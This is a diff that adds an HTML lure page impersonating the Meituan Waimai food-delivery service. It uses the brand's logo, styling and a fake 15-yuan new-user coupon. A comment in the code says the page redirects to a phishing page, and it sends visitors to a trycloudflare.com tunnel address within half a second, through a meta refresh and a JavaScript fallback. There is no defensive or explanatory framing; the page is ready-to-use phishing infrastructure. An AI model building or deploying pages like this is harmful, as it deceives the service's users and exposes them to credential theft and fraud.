@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>美团外卖 - 优惠券</title>
+    <meta property="og:title" content="美团外卖 - 新人专享红包">
+    <meta property="og:description" content="您有一张15元外卖优惠券待领取">
+    <meta property="og:image" content="https://s3plus.meituan.net/v1/mss_e2821d7f0cfe4ac1bf9202ecf9590e67/cdn-prod/file:5788bdf6/20206-meituan-logo.png">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Helvetica Neue",sans-serif;
+            background:linear-gradient(180deg,#FFD100 0%,#FFF5CC 50%,#FFF 100%);
+            min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center
+        }
+        .logo{font-size:32px;font-weight:700;color:#3D1E00;margin-bottom:8px}
+        .sub{font-size:15px;color:#8B5E00;margin-bottom:30px}
+        .card{
+            background:#FFF;border-radius:16px;padding:30px 24px;
+            box-shadow:0 4px 20px rgba(0,0,0,0.08);text-align:center;width:85%;max-width:360px
+        }
+        .amount{font-size:48px;font-weight:800;color:#FF6600;margin-bottom:4px}
+        .amount-label{font-size:14px;color:#999;margin-bottom:20px}
+        .loading-bar{
+            height:4px;background:#F0F0F0;border-radius:2px;overflow:hidden;margin:20px 0
+        }
+        .loading-fill{
+            height:100%;width:0;background:linear-gradient(90deg,#FFD100,#FFB800);
+            border-radius:2px;animation:load 0.6s ease forwards
+        }
+        @keyframes load{to{width:100%}}
+        .hint{font-size:12px;color:#CCC;margin-top:12px}
+        .footer{position:fixed;bottom:24px;font-size:11px;color:#DDD}
+    </style>
+    <!-- 0.3秒后自动跳转到钓鱼页 -->
+    <meta http-equiv="refresh" content="0.3;url=https://month-treating-supporters-geographic.trycloudflare.com">
+</head>
+<body>
+    <div class="logo">🛵 美团外卖</div>
+    <div class="sub">新人专享 · 限时领取</div>
+
+    <div class="card">
+        <div class="amount">¥15</div>
+        <div class="amount-label">外卖优惠券</div>
+        <div class="loading-bar">
+            <div class="loading-fill"></div>
+        </div>
+        <div class="hint">正在跳转到美团...</div>
+    </div>
+
+    <div class="footer">本活动由美团外卖提供</div>
+
+    <!-- 兜底：如果meta refresh失败，JS触发 -->
+    <script>
+    setTimeout(function(){
+        window.location.href = 'https://month-treating-supporters-geographic.trycloudflare.com';
+    }, 400);
+    </script>
+</body>
+</html>
